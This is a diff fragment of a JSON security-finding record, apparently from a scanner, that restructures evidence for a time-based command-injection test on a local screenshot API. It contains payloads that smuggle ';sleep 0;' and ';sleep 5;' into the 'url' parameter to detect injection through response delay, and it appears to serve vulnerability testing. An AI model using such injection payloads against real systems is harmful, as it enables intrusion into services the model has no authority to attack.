@@ -11,21 +11,21 @@
     "required": false
   },
   "evidence": {
-    "requests": {
-      "control": {
-        "method": "GET",
-        "url": "http://127.0.0.1:3009/api/screenshot?url=http%3A%2F%2F127.0.0.1%2F"
-      },
-      "delay_low": {
-        "method": "GET",
-        "url": "http://127.0.0.1:3009/api/screenshot?url=http%3A%2F%2F127.0.0.1%2F%3Fx%3D%22%3Bsleep%200%3B%22"
-      },
-      "delay_high": {
-        "method": "GET",
-        "url": "http://127.0.0.1:3009/api/screenshot?url=http%3A%2F%2F127.0.0.1%2F%3Fx%3D%22%3Bsleep%205%3B%22"
-      }
+    "base_request": {
+      "method": "GET",
+      "url": "http://127.0.0.1:3009/api/screenshot?url=http://127.0.0.1/"
     },
-    "vulnerable_parameter": "url"
+    "injection": {
+      "location": {
+        "kind": "query",
+        "name": "url"
+      },
+      "payloads": {
+        "control": "http://127.0.0.1/",
+        "delay_low": "http://127.0.0.1/?x=\";sleep 0;\"",
+        "delay_high": "http://127.0.0.1/?x=\";sleep 5;\""
+      }
+    }
   },
   "proof": {
     "repetitions": 4,
